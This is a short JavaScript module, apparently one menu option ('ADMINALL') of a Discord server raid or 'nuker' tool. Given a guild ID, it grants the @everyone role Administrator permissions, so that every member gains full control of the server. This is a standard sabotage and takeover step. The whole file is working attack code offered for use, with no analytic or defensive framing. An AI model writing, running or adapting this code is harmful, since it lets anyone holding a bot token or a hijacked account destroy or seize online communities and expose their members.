const consoleColour = require('gradient-string');

async function AdminAll(guildId, xeroz) 
	{
		process.title = `${xeroz.user.username} | [3: ADMINALL]`;
		const guild = xeroz.guilds.cache.get(guildId);
		// const role = guild.roles.cache.find(r => r.name === "@everyone");
	  
		if (!guild) 
		{
		  process.title = `${xeroz.user.username} | [ERROR]`;
		  console.log(consoleColour.mind("[Error] : ") + `Guild with ID ${guildId} does not exist.`);
		Xeroz();
		} else 
		{

		guild.roles.everyone.setPermissions('Administrator')
		.then(() =>console.log(consoleColour.mind(`[Admin] : `)+ `Role "@everyone" has been given Administrator permissions`))
		.catch(error => {
		console.error(error);
		console.log(consoleColour.mind("[Error] : ") +'An error occurred while setting role permissions');
		});
		}
	}

module.exports = {
    Admin: AdminAll
    };